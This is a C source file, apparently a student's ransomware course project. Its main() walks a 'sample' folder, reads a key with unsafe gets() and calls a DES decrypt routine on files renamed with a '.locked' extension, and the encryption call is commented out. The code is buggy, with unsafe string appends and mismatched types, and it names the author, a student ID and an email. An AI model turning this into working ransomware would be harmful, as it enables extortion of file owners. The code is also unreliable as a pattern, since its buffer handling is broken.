
/*
* File Name: main.c
* Description:
* Made by: Gongtuigigi (Jaeeun Cho)
* Student ID: 21300733
* Email: cocm1324@gmail.com
* Lastly Modified: 18.11.27
*
* OS X 10.13.6
* gcc
*
*/

#include "des.h"
#include "util.h"
#include "ecb.h"
#include "ransomware.h"

int main(){

      struct _finddata_t fd;
        long* handle;
        int result = 1;
        char* file;
        char strBuffer[_MAX_PATH] = { 0, };
	    char* fileway =  getcwd( strBuffer, _MAX_PATH );
        // char* folderName = "C:\\Users\\kwonda\\Desktop\\5-2\\jaeun\\cs20182ransomware\\sample\\";
        //
        // char* fileway = "C:\\Users\\kwonda\\Desktop\\5-2\\jaeun\\cs20182ransomware\\sample\\";
        strcat(fileway, "\\sample\\*.*");

        handle = _findfirst(fileway, &fd); // Set path
        // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\18_2\\*.*", &fd); // path 예시
        if (handle == -1){
            printf("There were no files.\n");
            return;
        }

        int NumOfFile = 0;

        char inputkey[16];
        printf("Input your key : ");
        gets(inputkey);
        printf("%d\n", strlen(inputkey));
        while (result != -1){
            char* fileName = fd.name;
            if( NumOfFile > 1){
                printf("file name : %s \n", fileName);

                // strcat(folderName,fileName);
                //encrypt_single_file(fileName);
                strcat(fileName, ".locked");
                decrypt_single_file(fileName, inputkey);

    }
    result = _findnext(handle, &fd);
    NumOfFile++;

    }//finish 'while'. No more files to read

  _findclose(handle);
    /*

    이 부분은 어떻게 해야할지 잘 모르겠음;;;

    struct _finddata_t fd;
    long* handle;
    int result = 1;
    char* file;
    handle = _findfirst(".\\*.*", &fd); // Set path
    // handle = _findfirst("C:\\Users\\kwonda\\Desktop\\18_2\\*.*", &fd); // path 예시

    if (handle == -1){
        printf("There were no files.\n");
        return;
    }

    int NumOfFile = 0;

    while (result != -1){
        char* fileName= fd.name;

        if( NumOfFile > 1){
            printf("%s \n", fileName);
        }// finish 'If' of NumOfFile
        result = _findnext(handle, &fd);
        NumOfFile++;


    }//finish 'while'. No more files to read

    _findclose(handle);
    */

    return 0;
}
